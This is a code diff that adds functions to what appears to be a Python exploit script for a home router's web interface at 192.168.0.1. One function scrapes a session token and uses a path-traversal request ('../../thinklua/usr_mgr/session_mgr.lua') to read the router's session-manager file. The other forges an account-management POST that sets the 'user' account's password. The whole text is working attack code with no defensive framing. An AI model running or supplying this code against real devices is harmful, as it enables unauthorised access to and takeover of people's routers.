@@ -109,6 +109,43 @@ def ping_post(r,sess_token):
     )
     print(a.text)
 
+def changepass_get(r):
+    a = r.get("http://192.168.0.1/?_type=menuView&_tag=accountMgr&Menu3Location=0")
+    btoken = re.search(r'_sessionTmpToken = "(.*?)";',a.text).group(1)
+    token = bytes.fromhex(btoken.replace('\\x','')).decode()
+    a = r.get("http://192.168.0.1/?_type=menuData&_tag=../../thinklua/usr_mgr/session_mgr.lua")
+    
+    print(a.text)
+    return(token)
+
+def changepass_post(r,sess_token):
+    token = sess_token
+    encode, passb64 = encodepass("user")
+    post_data = {
+        "IF_ACTION":"Apply",
+        "_InstID":"IGD.AU2",
+        "Right":"2",
+        "Enable":"1",
+        "Username":"user",
+        "Password": passb64,
+        "NewPassword": passb64,
+        "Keyword":"",
+        "Btn_cancel_AccountManag":"",
+        "Btn_apply_AccountManag":"",
+        "encode": encode,
+        "_sessionTOKEN":token
+    }
+    form = urllib.parse.urlencode(post_data)
+    print(form)
+    checkb64 = checkheader(form)
+    a = r.post("http://192.168.0.1/?_type=menuData&_tag=devauth_accountmgr_lua.lua",
+        data = post_data,
+        headers = {
+            "Check":checkb64
+        }
+    )
+    print(a.text)
+
 def traceroute_get(r):
     a = r.get("http://192.168.0.1/?_type=menuView&_tag=networkDiag&Menu3Location=0")
     btoken = re.search(r'_sessionTmpToken = "(.*?)";',a.text).group(1)
